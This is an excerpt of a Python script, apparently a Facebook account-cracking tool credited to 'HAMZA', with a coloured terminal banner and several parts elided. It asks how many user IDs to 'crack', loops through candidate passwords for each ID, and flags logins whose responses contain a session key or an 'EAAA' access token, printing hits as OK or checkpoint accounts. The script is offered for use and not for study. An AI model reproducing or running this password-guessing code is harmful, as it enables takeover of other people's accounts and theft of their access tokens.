#opensource_by_HAMZA
#thanks_irfan_github
#my_github_https://github.com/HAMZA
...
\033[1;90m════════════════════════════════════════════════
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFACEBOOK : HAMZA 
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFB GROUP : Fb Trick
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mGITHUB   : ALI HAMZA
...
class Main:
	...
	def fbtua(self):
		...
		limit = int(input(" \033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50: "))
		try:
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[HAMZA] : %s/%s -> \033[0;97m [HAMZAOK:%s ] \033[0;97m[HAMZACP:%s ]"%(W,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r  \033[0;91m   [Hamza-CP] %s | %s\033[0;97m         "%(uid, pw))
